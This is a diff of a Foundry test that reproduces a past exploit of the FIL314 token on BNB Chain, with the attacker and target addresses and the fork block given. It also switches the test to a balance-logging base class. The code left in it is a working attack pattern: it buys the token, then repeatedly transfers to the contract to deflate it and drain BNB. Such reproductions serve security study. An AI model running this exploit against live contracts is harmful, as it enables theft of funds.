@@ -1,8 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "forge-std/Test.sol";
-import "./../interface.sol";
+import "../basetest.sol";
 
 // @KeyInfo - Total Lost : ~14 BNB
 // Attacker : https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c
@@ -21,18 +20,16 @@ interface IFIL314 {
     function balanceOf(address account) external view returns (uint256);
 }
 
-contract FIL314 is Test {
+contract FIL314 is BaseTestWithBalanceLog {
     uint256 blocknumToForkFrom = 37795991;
     IFIL314 FIL314 = IFIL314(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF);
 
     function setUp() public {
-
         vm.createSelectFork("bsc", blocknumToForkFrom);
     }
 
-    function testExploit() public {
-        // Implement exploit code here
-         emit log_named_decimal_uint(" Attacker BNB Balance Before exploit", address(this).balance, 18);
+    function testExploit() public balanceLog {
+        vm.deal(address(this),0.05 ether);
          // buy FIL314 token
          address(FIL314).call{value: 0.05 ether}("");
          // deflate the token
@@ -45,8 +42,6 @@ contract FIL314 is Test {
             FIL314.transfer(address(FIL314), amount);
         }
 
-        // Log balances after exploit
-        emit log_named_decimal_uint(" Attacker BNB Balance After exploit", address(this).balance, 18);
     }
 
     fallback() external payable {}
